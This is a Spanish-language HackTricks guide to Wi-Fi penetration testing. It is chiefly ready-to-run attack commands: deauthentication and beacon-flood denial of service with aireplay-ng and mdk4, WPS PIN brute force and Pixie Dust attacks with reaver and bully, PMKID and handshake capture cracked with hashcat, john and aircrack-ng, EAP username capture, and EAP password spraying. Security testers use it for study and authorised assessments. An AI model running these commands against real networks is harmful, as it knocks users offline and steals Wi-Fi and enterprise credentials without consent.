# Pentesting Wifi

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e insights en tiempo real.

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cr√≠ticas de la plataforma.

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo.

## Comandos b√°sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Herramientas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para lograr obtener la contrase√±a real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Autom√°ticamente:

* Configura la interfaz en modo monitor
* Escanea redes posibles - Y te permite seleccionar la(s) v√≠ctima(s)
* Si es WEP - Lanza ataques WEP
* Si es WPA-PSK
* Si es WPS: Ataque Pixie dust y el ataque de fuerza bruta (ten cuidado, el ataque de fuerza bruta puede llevar mucho tiempo). Ten en cuenta que no intenta PIN nulo o PINs de base de datos/generados.
* Intenta capturar el PMKID del AP para descifrarlo
* Intenta desautenticar clientes del AP para capturar un handshake
* Si PMKID o Handshake, intenta fuerza bruta usando las 5000 contrase√±as m√°s comunes.

## Resumen de Ataques

* **DoS**
* Desautenticaci√≥n/desasociaci√≥n -- Desconectar a todos (o un ESSID/Cliente espec√≠fico)
* APs falsos aleatorios -- Ocultar redes, posibles ca√≠das de esc√°neres
* Sobrecargar AP -- Intentar matar el AP (generalmente no muy √∫til)
* WIDS -- Jugar con el IDS
* TKIP, EAPOL -- Algunos ataques espec√≠ficos para DoS algunos APs
* **Cracking**
* Descifrar **WEP** (varias herramientas y m√©todos)
* **WPA-PSK**
* **WPS** pin "Fuerza Bruta"
* **WPA PMKID** fuerza bruta
* \[DoS +] **WPA handshake** captura + Descifrado
* **WPA-MGT**
* **Captura de nombre de usuario**
* **Fuerza bruta** Credenciales
* **Evil Twin** (con o sin DoS)
* **Open** Evil Twin \[+ DoS] -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **WPA-PSK** Evil Twin -- √ötil para ataques de red si conoces la contrase√±a
* **WPA-MGT** -- √ötil para capturar credenciales de empresa
* **KARMA, MANA**, **Loud MANA**, **Known beacon**
* **+ Open** -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DOS

### Paquetes de Desautenticaci√≥n

La forma m√°s com√∫n de realizar este tipo de ataque es con paquetes de **desautenticaci√≥n**. Estos son un tipo de trama de "gesti√≥n" responsable de desconectar un dispositivo de un punto de acceso. Falsificar estos paquetes es la clave para [hackear muchas redes Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), ya que puedes desconectar forzosamente a cualquier cliente de la red en cualquier momento. La facilidad con la que esto se puede hacer es algo aterrador y a menudo se hace como parte de la recolecci√≥n de un handshake WPA para descifrar.

Adem√°s de usar moment√°neamente esta desconexi√≥n para recolectar un handshake para descifrar, tambi√©n puedes simplemente dejar que esos deauths sigan llegando, lo que tiene el efecto de bombardear al cliente con paquetes de deauth aparentemente provenientes de la red a la que est√°n conectados. Debido a que estas tramas no est√°n cifradas, muchos programas aprovechan las tramas de gesti√≥n falsific√°ndolas y envi√°ndolas a uno o todos los dispositivos en una red.\
**Descripci√≥n de** [**aqu√≠**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Desautenticaci√≥n usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautenticaci√≥n
* 1 es el n√∫mero de desautenticaciones a enviar (puedes enviar varias si lo deseas); 0 significa enviarlas continuamente
* \-a 00:14:6C:7E:40:80 es la direcci√≥n MAC del punto de acceso
* \-c 00:0F:B5:34:30:30 es la direcci√≥n MAC del cliente a desautenticar; si se omite, se env√≠a una desautenticaci√≥n de difusi√≥n (no siempre funciona)
* ath0 es el nombre de la interfaz

### Paquetes de Desasociaci√≥n

Los paquetes de desasociaci√≥n son otro tipo de trama de gesti√≥n que se utiliza para desconectar un nodo (es decir, cualquier dispositivo como una laptop o tel√©fono celular) de un punto de acceso cercano. La diferencia entre las tramas de desautenticaci√≥n y desasociaci√≥n es principalmente la forma en que se utilizan.

Un AP que busca desconectar un dispositivo no autorizado enviar√≠a un paquete de desautenticaci√≥n para informar al dispositivo que ha sido desconectado de la red, mientras que un paquete de desasociaci√≥n se utiliza para desconectar cualquier nodo cuando el AP se est√° apagando, reiniciando o abandonando el √°rea.

**Descripci√≥n de** [**aqu√≠**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Este ataque se puede realizar con mdk4(modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **M√°s ataques DOS por mdk4**

**Desde** [**aqu√≠**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inundaci√≥n de Beacons**

Env√≠a tramas beacon para mostrar APs falsos a los clientes. ¬°Esto a veces puede colapsar esc√°neres de red e incluso controladores!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Denegaci√≥n de Servicio de Autenticaci√≥n**

Env√≠a tramas de autenticaci√≥n a todos los APs encontrados en el rango. Demasiados clientes pueden congelar o reiniciar varios APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondeo de SSID y Fuerza Bruta**

Sondea APs y verifica respuestas, √∫til para comprobar si el SSID ha sido correctamente desocultado y si el AP est√° dentro de tu rango de env√≠o. La **fuerza bruta de SSIDs ocultos** con o sin una lista de palabras tambi√©n est√° disponible.

**MODO DE ATAQUE m: Explotaci√≥n de Contramedidas Michael**

Env√≠a paquetes aleatorios o reinjecta duplicados en otra cola QoS para provocar Contramedidas Michael en **APs TKIP**. El AP se apagar√° durante un minuto entero, lo que lo convierte en un **DoS** efectivo.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inyecci√≥n de Paquetes EAPOL Start y Logoff**

Inunda un AP con marcos **EAPOL** Start para mantenerlo ocupado con **sesiones falsas** e impide que maneje clientes leg√≠timos. O desconecta a los clientes **inyectando mensajes falsos** EAPOL **Logoff**.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes de malla IEEE 802.11s**

Varios ataques en la gesti√≥n de enlaces y enrutamiento en redes de malla. ¬°Inunda vecinos y rutas, crea agujeros negros y desv√≠a el tr√°fico!

**MODO DE ATAQUE w: Confusi√≥n WIDS**

Confunde/Abusa de los Sistemas de Detecci√≥n y Prevenci√≥n de Intrusiones conectando clientes de manera cruzada a m√∫ltiples nodos WDS o APs falsos y maliciosos.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Packet Fuzzer**

Un fuzzer de paquetes simple con m√∫ltiples fuentes de paquetes y un buen conjunto de modificadores. ¬°Ten cuidado!

### **Airgeddon**

_**Airgeddon**_ ofrece la mayor√≠a de los ataques propuestos en los comentarios anteriores:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS significa Wi-Fi Protected Setup. Es un est√°ndar de seguridad de red inal√°mbrica que intenta hacer que las conexiones entre un enrutador y dispositivos inal√°mbricos sean m√°s r√°pidas y f√°ciles. **WPS solo funciona para redes inal√°mbricas que usan una contrase√±a** que est√° cifrada con los protocolos de seguridad **WPA** Personal o **WPA2** Personal. WPS no funciona en redes inal√°mbricas que est√°n utilizando la seguridad WEP obsoleta, la cual puede ser vulnerada f√°cilmente por cualquier hacker con un conjunto b√°sico de herramientas y habilidades. (De [aqu√≠](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS utiliza un PIN de 8 d√≠gitos para permitir que un usuario se conecte a la red, pero primero se verifica los primeros 4 n√∫meros y, si son correctos, luego se verifica los segundos 4 n√∫meros. Entonces, es posible hacer Brute-Force de la primera mitad y luego de la segunda mitad (solo 11000 posibilidades).

### WPS Bruteforce

Hay 2 herramientas principales para realizar esta acci√≥n: Reaver y Bully.

* **Reaver** ha sido dise√±ado para ser un ataque robusto y pr√°ctico contra WPS, y ha sido probado contra una amplia variedad de puntos de acceso e implementaciones de WPS.
* **Bully** es una **nueva implementaci√≥n** del ataque de fuerza bruta WPS, escrita en C. Tiene varias ventajas sobre el c√≥digo original de reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de la endianness y un conjunto de opciones m√°s robusto.

Este ataque aprovecha una **debilidad en el c√≥digo PIN de WPS de ocho d√≠gitos**; debido a este problema, el protocolo **revela informaci√≥n sobre los primeros cuatro d√≠gitos del PIN**, y el **√∫ltimo** d√≠gito funciona como un **checksum**, lo que facilita el brute forcing del AP WPS.\
Tenga en cuenta que algunos dispositivos incluyen **protecciones contra fuerza bruta**, que generalmente **bloquean direcciones MAC** que intentan atacar repetidamente. En ese caso, la complejidad de este ataque aumenta, porque tendr√≠as que **rotar direcciones MAC** mientras pruebas los PINs.

Si se encuentra el c√≥digo WPS v√°lido, tanto Bully como Reaver lo utilizar√°n para descubrir el PSK WPA/WPA2 utilizado para proteger la red, por lo que podr√°s conectarte siempre que lo necesites.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute force**

En lugar de comenzar probando todos los PIN posibles, deber√≠as verificar si hay **PINs descubiertos para el AP que est√°s atacando** (dependiendo del MAC del fabricante) y los **PINs generados por software**.

* La base de datos de PINs conocidos est√° hecha para Puntos de Acceso de ciertos fabricantes para los cuales se sabe que usan los mismos PINs WPS. Esta base de datos contiene los primeros tres octetos de direcciones MAC y una lista de PINs correspondientes que son muy probables para este fabricante.
* Hay varios algoritmos para generar PINs WPS. Por ejemplo, ComputePIN y EasyBox usan la direcci√≥n MAC del Punto de Acceso en sus c√°lculos. Pero el algoritmo de Arcadyan tambi√©n requiere una ID de dispositivo.

### Ataque WPS Pixie Dust

Dominique Bongard descubri√≥ que algunos APs tienen formas d√©biles de generar **nonces** (conocidos como **E-S1** y **E-S2**) que se supone que son secretos. Si podemos descubrir cu√°les son estos nonces, podemos encontrar f√°cilmente el PIN WPS de un AP ya que el AP debe d√°rnoslo en un hash para probar que tambi√©n conoce el PIN, y que el cliente no se est√° conectando a un AP falso. Estos E-S1 y E-S2 son esencialmente las "llaves para desbloquear la caja fuerte" que contiene el PIN WPS. M√°s informaci√≥n aqu√≠: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

B√°sicamente, algunas implementaciones fallaron en el uso de claves aleatorias para encriptar las 2 partes del PIN (ya que se descompone en 2 partes durante la comunicaci√≥n de autenticaci√≥n y se env√≠a al cliente), por lo que se podr√≠a utilizar un ataque offline para forzar bruscamente el PIN v√°lido.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Ataque Null Pin

Algunas implementaciones realmente malas permit√≠an la conexi√≥n con el PIN nulo (tambi√©n muy extra√±o). Reaver puede probar esto (Bully no puede).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques WPS propuestos se pueden realizar f√°cilmente utilizando _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
* 7 y 8 realizan el ataque **Pixie Dust**
* 13 te permite probar el **PIN NULO**
* 11 y 12 **recopilar√°n los PINes relacionados con el AP seleccionado de bases de datos disponibles** y **generar√°n** posibles **PINes** utilizando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¬øpor qu√© no?)
* 9 y 10 probar√°n **todos los PINes posibles**

## **WEP**

Tan roto y desaparecido que no voy a hablar de √©l. Solo debes saber que _**airgeddon**_ tiene una opci√≥n WEP llamada "Todo en Uno" para atacar este tipo de protecci√≥n. M√°s herramientas ofrecen opciones similares.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Hacking Insights**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e insights en tiempo real.

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cruciales de la plataforma.

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo.

## WPA/WPA2 PSK

### PMKID

En 2018, los autores de hashcat [divulgaron](https://hashcat.net/forum/thread-7717.html) un nuevo tipo de ataque que no solo depende **de un √∫nico paquete**, sino que no requiere que ning√∫n cliente est√© conectado a nuestro AP objetivo, sino solo comunicaci√≥n entre el atacante y el AP.

Resulta que **muchos** routers modernos a√±aden un **campo opcional** al final del **primer marco EAPOL** enviado por el propio AP cuando alguien se est√° asociando, el llamado `Robust Security Network`, que incluye algo llamado `PMKID`

Como se explica en la publicaci√≥n original, el **PMKID** se deriva utilizando datos que nos son conocidos:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**Dado que la cadena "PMK Name" es constante, conocemos tanto el BSSID del AP como de la estaci√≥n y el `PMK` es el mismo obtenido de un handshake completo de 4 v√≠as**, ¬°esto es todo lo que hashcat necesita para descifrar el PSK y recuperar la frase de paso!
Descripci√≥n obtenida de [aqu√≠](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Para **recolectar** esta informaci√≥n y **fuerza bruta** localmente la contrase√±a puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs capturados** se mostrar√°n en la **consola** y tambi√©n se **guardar√°n** dentro de \_**/tmp/attack.pcap**\_
Ahora, convierte la captura al formato de **hashcat/john** y descr√≠ptala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tenga en cuenta que el formato de un hash correcto contiene **4 partes**, como: _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Si el suyo **solo** contiene **3 partes**, entonces, es **inv√°lido** (la captura de PMKID no fue v√°lida).

Note que `hcxdumptool` **tambi√©n captura handshakes** (algo as√≠ aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Podr√≠a **transformar** los **handshakes** al formato de **hashcat**/**john** utilizando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_He notado que algunos handshakes capturados con esta herramienta no pudieron ser descifrados incluso sabiendo la contrase√±a correcta. Recomendar√≠a capturar handshakes tambi√©n de manera tradicional si es posible, o capturar varios de ellos usando esta herramienta._

### Captura de Handshake

Una forma de atacar redes **WPA/WPA2** es capturar un **handshake** e intentar **descifrar** la contrase√±a utilizada **offline**. Para hacerlo necesitas encontrar el **BSSID** y **canal** de la red **v√≠ctima**, y un **cliente** que est√© conectado a la red.\
Una vez que tienes esa informaci√≥n debes comenzar a **escuchar** toda la comunicaci√≥n de ese **BSSID** en ese **canal**, porque con suerte el handshake ser√° enviado all√≠:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Ahora necesitas **desautenticar** al **cliente** por unos segundos para que se autentique autom√°ticamente de nuevo al AP (por favor, lee la parte de DoS para encontrar varias formas de desautenticar a un cliente):
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Nota que como el cliente fue desautenticado, podr√≠a intentar conectarse a un AP diferente o, en otros casos, a una red diferente._

Una vez que en `airodump-ng` aparece informaci√≥n del handshake, esto significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../.gitbook/assets/image (172) (1).png>)

Una vez capturado el handshake, puedes **crackearlo** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar si el handshake est√° en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un handshake incompleto de un ESSID antes que uno completo, no detectar√° el v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Es importante hablar sobre los **diferentes m√©todos de autenticaci√≥n** que podr√≠an ser utilizados por una Wifi empresarial. Para este tipo de Wifis probablemente encontrar√°s en `airodump-ng` algo como esto:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Protocolo de Autenticaci√≥n Extensible) es la **calavera** de la **comunicaci√≥n de autenticaci√≥n**, sobre esto, un **algoritmo de autenticaci√≥n** es utilizado por el servidor para autenticar al **cliente** (**supplicant**) y en algunos casos por el cliente para autenticar al servidor.
Principales algoritmos de autenticaci√≥n utilizados en este caso:

* **EAP-GTC:** Es un m√©todo EAP para soportar el uso de tokens de hardware y contrase√±as de un solo uso con EAP-PEAP. Su implementaci√≥n es similar a MSCHAPv2, pero no utiliza un desaf√≠o entre pares. En cambio, las contrase√±as se env√≠an al punto de acceso en **texto plano** (muy interesante para ataques de degradaci√≥n).
* **EAP-MD-5 (Message Digest):** El cliente env√≠a el hash MD5 de la contrase√±a. **No recomendado**: Vulnerable a ataques de diccionario, no hay autenticaci√≥n del servidor y no hay forma de generar claves de privacidad equivalentes al cableado (WEP) por sesi√≥n.
* **EAP-TLS (Transport Layer Security):** Se basa en **certificados del lado del cliente y del servidor** para realizar la autenticaci√≥n y se puede utilizar para generar din√°micamente claves WEP basadas en el usuario y la sesi√≥n para asegurar las comunicaciones posteriores.
* **EAP-TTLS (Tunneled Transport Layer Security):** **Autenticaci√≥n mutua** del cliente y la red a trav√©s de un canal cifrado (o t√∫nel), as√≠ como un medio para derivar claves WEP din√°micas, por usuario y por sesi√≥n. A diferencia de EAP-TLS, **EAP-TTLS solo requiere certificados del lado del servidor (el cliente usar√° credenciales)**.
* **PEAP (Protocolo de Autenticaci√≥n Extensible Protegido):** PEAP es como el protocolo **EAP** pero creando un **t√∫nel TLS** para proteger la comunicaci√≥n. Luego, protocolos de autenticaci√≥n d√©biles pueden ser utilizados sobre EAP ya que estar√°n protegidos por el t√∫nel.
* **PEAP-MSCHAPv2**: Esto tambi√©n es conocido simplemente como **PEAP** porque es ampliamente adoptado. Esto es solo el vulnerable desaf√≠o/respuesta llamado MSCHAPv2 sobre PEAP (est√° protegido por el t√∫nel TLS).
* **PEAP-EAP-TLS o simplemente PEAP-TLS**: Es muy similar a **EAP-TLS** pero se crea un t√∫nel TLS antes de que se intercambien los certificados.

Puedes encontrar m√°s informaci√≥n sobre estos m√©todos de autenticaci√≥n [aqu√≠](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) y [aqu√≠](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nombre de Usuario

Leyendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si est√°s utilizando **EAP**, los **mensajes "Identity"** deben ser **soportados**, y el **nombre de usuario** va a ser enviado en **claro** en los mensajes **"Response Identity"**.

Incluso utilizando uno de los m√©todos de autenticaci√≥n m√°s seguros: **PEAP-EAP-TLS**, es posible **capturar el nombre de usuario enviado en el protocolo EAP**. Para hacerlo, **captura una comunicaci√≥n de autenticaci√≥n** (inicia `airodump-ng` dentro de un canal y `wireshark` en la misma interfaz) y filtra los paquetes por `eapol`.\
Dentro del paquete "**Response, Identity**", aparecer√° el **nombre de usuario** del cliente.

![](<../../.gitbook/assets/image (150).png>)

### Identidades An√≥nimas

(Informaci√≥n tomada de [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm))

Tanto **EAP-PEAP como EAP-TTLS soportan ocultamiento de identidad**. En un entorno WiFi, el punto de acceso (AP) t√≠picamente genera una solicitud de EAP-Identity como parte del proceso de asociaci√≥n. Para preservar el anonimato, el cliente EAP en el sistema del usuario puede responder con solo suficiente informaci√≥n para permitir que el primer servidor RADIUS procese la solicitud, como se muestra en los siguientes ejemplos.

* _**EAP-Identity = anonymous**_

> En este ejemplo, todos los usuarios compartir√°n el pseudo-nombre de usuario ‚Äúanonymous‚Äù. El primer servidor RADIUS es un servidor EAP-PEAP o EAP-TTLS que maneja el extremo del servidor del protocolo PEAP o TTLS. El tipo de autenticaci√≥n interna (protegida) ser√° entonces manejada localmente o proxy a un servidor RADIUS remoto (de origen).

* _**EAP-Identity = anonymous@realm_x**_

> En este ejemplo, los usuarios pertenecientes a diferentes reinos ocultan su propia identidad pero indican a qu√© reino pertenecen para que el primer servidor RADIUS pueda hacer proxy de las solicitudes EAP-PEAP o EAP-TTLS a servidores RADIUS en sus reinos de origen que actuar√°n como el servidor PEAP o TTLS. El primer servidor act√∫a puramente como un nodo de retransmisi√≥n RADIUS.
>
> Alternativamente, el primer servidor puede actuar como el servidor EAP-PEAP o EAP-TTLS y procesar el m√©todo de autenticaci√≥n protegido o hacer proxy a otro servidor. Esta opci√≥n puede ser utilizada para configurar diferentes pol√≠ticas para diferentes reinos.

En EAP-PEAP, una vez que el servidor PEAP y el cliente PEAP establecen el t√∫nel TLS, el servidor PEAP genera una solicitud de EAP-Identity y la transmite a trav√©s del t√∫nel TLS. El cliente responde a esta segunda solicitud de EAP-Identity enviando una respuesta de EAP-Identity que contiene la verdadera identidad del usuario a trav√©s del t√∫nel cifrado. Esto evita que cualquiera que est√© escuchando el tr√°fico 802.11 descubra la verdadera identidad del usuario.

EAP-TTLS funciona ligeramente diferente. Con EAP-TTLS, el cliente t√≠picamente se autentica a trav√©s de PAP o CHAP protegido por el t√∫nel TLS. En este caso, el cliente incluir√° un atributo User-Name y un atributo Password o CHAP-Password en el primer mensaje TLS enviado despu√©s de que se establezca el t√∫nel.

Con cualquiera de los protocolos, el servidor PEAP/TTLS aprende la verdadera identidad del usuario una vez que se ha establecido el t√∫nel TLS. La verdadera identidad puede ser en la forma _**user@realm**_ o simplemente _**user**_. Si el servidor PEAP/TTLS tambi√©n est√° autenticando al _**usuario**_, ahora conoce la identidad del usuario y procede con el m√©todo de autenticaci√≥n que est√° siendo protegido por el t√∫nel TLS. Alternativamente, el servidor PEAP/TTLS puede reenviar una nueva solicitud RADIUS al servidor RADIUS de origen del usuario. Esta nueva solicitud RADIUS tiene el protocolo PEAP o TTLS eliminado. Si el m√©todo de autenticaci√≥n protegido es EAP, los mensajes EAP internos se transmiten al servidor RADIUS de origen sin el envoltorio EAP-PEAP o EAP-TTLS. El atributo User-Name del mensaje RADIUS saliente contiene la verdadera identidad del usuario, no la identidad an√≥nima del atributo User-Name de la solicitud RADIUS entrante. Si el m√©todo de autenticaci√≥n protegido es PAP o CHAP (solo soportado por TTLS), el User-Name y otros atributos de autenticaci√≥n recuperados del payload TLS se colocan en el mensaje RADIUS saliente en lugar del User-Name an√≥nimo y los atributos EAP-Message de TTLS incluidos en la solicitud RADIUS entrante.

### EAP-Bruteforce (password spray)

Si se espera que el cliente utilice un **nombre de usuario y contrase√±a** (nota que **EAP-TLS no ser√° v√°lido** en este caso), entonces podr√≠as intentar obtener una **lista** de **nombres de usuario** (ver la siguiente parte) y **contrase√±as** e intentar **fuerza bruta** en el acceso utilizando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Tambi√©n podr√≠as realizar este ataque utilizando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Ataques a clientes Teor√≠a

### Selecci√≥n de Red y Roaming

